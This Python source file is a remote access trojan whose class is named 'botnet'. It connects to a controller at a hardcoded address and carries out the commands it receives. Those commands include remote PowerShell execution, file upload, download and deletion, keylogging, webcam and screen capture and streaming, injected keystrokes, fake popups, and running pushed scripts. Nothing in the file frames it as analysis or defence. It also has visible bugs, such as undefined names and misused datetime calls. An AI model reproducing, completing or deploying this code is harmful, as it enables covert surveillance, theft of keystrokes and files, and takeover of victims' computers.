import os
import cv2
import time
import numpy
import socket
import shutil
import pickle
import struct
import requests
import pyautogui
import threading
import subprocess
from datetime import datetime
from tkinter import Tk,messagebox
from pynput.keyboard import Listener
from zipfile import ZipFile,ZIP_DEFLATED
'''from socket import socket,SHUT_WR,AF_INET,SOCK_STREAM
from base64 import decodebytes
from os import system , remove , listdir,mkdir,getcwd,chdir,walk
from os.path import join,basename
from subprocess import run
from time import sleep
from requests import get
from tkinter import Tk,messagebox
from shutil import rmtree
from threading import Thread
from datetime import datetime
from pynput.keyboard import Listener
from zipfile import ZipFile,ZIP_DEFLATED
from numpy import array
from cv2 import cvtColor,COLOR_RGB2BGR,imwrite
import cv2
import pyautogui
from zlib import compress
import numpy as np
import pickle
import struct
from mss import mss
import threading
import os'''

class StreamingClient:
    def __init__(self,sock):
        self._configure()
        self.__running = False
        self.__client_socket = sock

    def _configure(self):
        self.__encoding_parameters = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

    def _get_frame(self):
        return None

    def _cleanup(self):
        cv2.destroyAllWindows()

    def __client_streaming(self):
        while self.__running:
            frame = self._get_frame()
            result, frame = cv2.imencode('.jpg', frame, self.__encoding_parameters)
            data = pickle.dumps(frame, 0)
            size = len(data)

            try:
                self.__client_socket.sendall(struct.pack('>L', size) + data)
            except ConnectionResetError:
                self.__running = False
            except ConnectionAbortedError:
                self.__running = False
            except BrokenPipeError:
                self.__running = False

        self._cleanup()

    def start_stream(self):

        if self.__running:
            print("Client is already streaming!")
        else:
            self.__running = True
            client_thread = threading.Thread(target=self.__client_streaming)
            client_thread.start()

    def stop_stream(self):
        if self.__running:
            self.__running = False
        else:
            print("Client not streaming!")


class CameraClient(StreamingClient):

    def __init__(self,sock , x_res=1024, y_res=576):
        self.__x_res = x_res
        self.__y_res = y_res
        self.__camera = cv2.VideoCapture(0)
        super(CameraClient, self).__init__(sock)

    def _configure(self):
        self.__camera.set(3, self.__x_res)
        self.__camera.set(4, self.__y_res)
        super(CameraClient, self)._configure()

    def _get_frame(self):
        ret, frame = self.__camera.read()
        return frame

    def _cleanup(self):
        self.__camera.release()
        cv2.destroyAllWindows()


class ScreenShareClient(StreamingClient):
    def __init__(self,sock, x_res=1920, y_res=1080):
        self.__x_res = x_res
        self.__y_res = y_res
        super(ScreenShareClient, self).__init__(sock)

    def _get_frame(self):
        screen = pyautogui.screenshot()
        frame = numpy.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = cv2.resize(frame, (self.__x_res, self.__y_res), interpolation=cv2.INTER_AREA)
        return frame






class botnet:
	"""docstring for botnet"""
	def __init__(self,host,port):
		self.finish_time = 24
		self.encoding_format = 'utf-8'
		self.host = host
		self.port = port
		self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.buffer_size = 1024

	def encoded(self,msg):
		return msg.encode(self.encoding_format)

	def decoded(self,msg):
		return msg.decode(self.encoding_format)

	def recv_command(self):
		return self.decoded(self.client.recv(self.buffer_size))

	def reconnect(self):
		self.client.shutdown(socket.SHUT_WR)
		self.client.close()
		self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.client.connect((self.host,self.port))

	def start_extract(self):
		self.extract_zip_thread = Thread(target=self.extract_zip)
		self.extract_zip_thread.start()

	def start_archive(self):
		self.archive_dir_thread = Thread(target=self.archive)
		self.archive_dir_thread.start()

	def start_keylogger(self):
		self.keylogger_thread = Thread(target=self.keylogger)
		self.keylogger_thread.start()

	def stop_keylogger(self):
		self.finish_time=datetime.datetime.now().hour

	def start_screenshare(self):
		self.screenshare_client = ScreenShareClient(self.client)
		self.screenshare_client.start_stream()

	def start_camera(self):
		self.camera_client = CameraClient(self.client)
		self.camera_client.start_stream()

	def stop_screenshare(self):
		self.screenshare_client.stop_stream()

	def stop_camera(self):
		self.camera_client.stop_stream()

	def print_dir(self):
		self.client.send(self.encoded(os.getcwd()))

	def change_dir(self,path):
		os.chdir(path)
		self.client.send(self.encoded(os.getcwd()))

	def make_dir(self):
		directory = self.recv_command()
		os.mkdir(directory)

	def remove_dir(self):
		directory = self.recv_command()
		shutil.rmtree(directory)

	def remove_file(self):
		file = self.recv_command()
		os.remove(file)

	def open_file(self):
		file = self.recv_command()
		os.system(file)

	def list_dir(self):
		output = ''
		for obj in os.listdir():
			output+=str(obj)+'\n'
		self.client.send(self.encoded(output))
		self.client.send(self.encoded(''))
		self.reconnect()

	def execute_powershell(self):
		command = self.recv_command()
		p1=subprocess.run(['powershell.exe',command],shell=True,capture_output=True,text=True)
		self.client.send(self.encoded(p1.stdout))
		self.client.send(self.encoded(''))

	def send_file(self):
		path = self.recv_command()
		with open(path,'rb') as f:
			file_data = f.read(self.buffer_size)

			while file_data:
				self.client.send(file_data)
				file_data = f.read(self.buffer_size)

			self.reconnect()

	def recieve_file(self):
		name = self.recv_command()
		with open(name,'wb') as f:
			file_data = self.client.recv(self.buffer_size)

			while file_data:
				f.write(file_data)
				file_data = self.client.recv(self.buffer_size)

			self.reconnect()

	def extract_zip(self):
		zip_path = self.recv_command()
		dir_name = os.path.basename(zip_path).replace('.zip','')
		with ZipFile(zip_path,'r') as f:
			f.extractall(dir_name)

	def archive(self):
		folder   = self.recv_command()
		zip_name = os.path.basename(folder)+'.zip'

		folder = os.path.join(folder,'')
		current_path = os.getcwd()
		folder_path  = os.path.join(current_path,folder)
		zip_path     = os.path.join(current_path,zip_name)

		os.chdir(folder)

		with ZipFile(zip_path,'w',compression=ZIP_DEFLATED) as myzip:
			for root,dirs,files in os.walk(folder_path):
				for file in files:
					root = root.replace(folder_path,'')
					file = os.path.join(root,file)
					myzip.write(file)

	def screenshot(self):
		image = cv2.cvtColor(numpy.array(pyautogui.screenshot()),cv2.COLOR_RGB2BGR)
		file_name = 'screenshot.png'

		cv2.imwrite(file_name, image)

		with open(file_name,'rb') as f:
			file_contents=f.read(self.buffer_size)
			while file_contents:
				self.client.send(file_contents)
				file_contents=f.read(self.buffer_size)

		os.remove(file_name)
		self.reconnect()

	def camera(self):
		cam = cv2.VideoCapture(0)
		ret,frame = cam.read()
		file_name = 'camera.png'
		cv2.imwrite(file_name, frame)

		with open(file_name,'rb') as f:
			file_contents=f.read(self.buffer_size)
			while file_contents:
				self.client.send(file_contents)
				file_contents=f.read(self.buffer_size)

		os.remove(file_name)
		self.reconnect()

	def keyboard(self):
		option=int(self.recv_command())
		if option==1:
			name = 'script.pyw'
			with open(name,'w') as f:
				file_contents = self.recv_command()
				while file_contents:
					f.write(file_data)
					file_data = self.recv_command()

			os.system(name)
			os.remove(name)
			self.reconnect()

		elif option==2:
			while True:
				string = self.recv_command()+'\n'
				if string=='exit\n':
					return
				else:
					for i in string:
						pyautogui.typewrite(i)

	def keylogger(self):
		string = ''
		file_name = str(datetime.today().date())+'.txt'
		path = os.path.join(self.home,'logs',file_name)

		def write(key):
			nonlocal l,string
			key=str(key)
			with open(path,'a') as f:
				if datetime.now().hour >= self.finish_time:
					f.write(string+'\n')
					l.stop()
				else:
					if key=='Key.enter':
						f.write(string+'\n')
						string=''

					elif key=='Key.space':
						string+=' '
	
					elif 'Key' in key:
						string+='~'+key+'~'

					else:
						string+=key.replace("'","")

		with Listener(on_press=write) as l:
			if 'logs' not in listdir(home):
				mkdir('logs')
			l.join()

	def popup(self):
		root = Tk()
		root.withdraw()
		title,message,ptype= self.recv_command().split('~')

		if ptype=='error':
			messagebox.showerror(title,message)
		elif ptype=='warning':
			messagebox.showwarning(title,message)
		elif ptype=='info':
			messagebox.showinfo(title,message)
		root.destroy()
		self.client.send('success'.encode('utf-8'))

	def run(self):
		self.client.connect((self.host,self.port))
		while True:
			server_command = self.recv_command()

			if server_command=='send file':
				self.recieve_file()

			elif server_command=='recieve file':
				self.send_file()

			elif server_command=='open file':
				self.open_file()

			elif server_command=='popup':
				self.popup()

			elif server_command=='ls':
				self.list_dir()

			elif server_command[:2]=='cd':
				self.change_dir(server_command.split()[1])

			elif server_command=='pwd':
				self.print_dir()

			elif server_command=='make directory':
				self.make_dir()

			elif server_command=='remove file':
				self.remove_file()

			elif server_command=='remove directory':
				self.remove_dir()

			elif server_command=='keyboard access':
				self.keyboard()

			elif server_command=='screenshot':
				self.screenshot()

			elif server_command=='take picture':
				self.camera()

			elif server_command=='start keylogger':
				self.start_keylogger()

			elif server_command=='stop keylogger':
				self.stop_keylogger()

			elif server_command=='extract':
				self.start_extract()

			elif server_command=='archive':
				self.start_archive()

			elif server_command=='stream screen':
				self.start_screenshare()

			elif server_command=='stream cam':
				self.start_camera()

			elif server_command=='stop screenshare':
				self.stop_screenshare()

			elif server_command=='stop camshare':
				self.stop_camera()

			elif server_command=='powershell':
				self.execute_powershell()

			elif server_command=='exit':
				break











tg = botnet('127.0.1.1',1234)
tg.run()

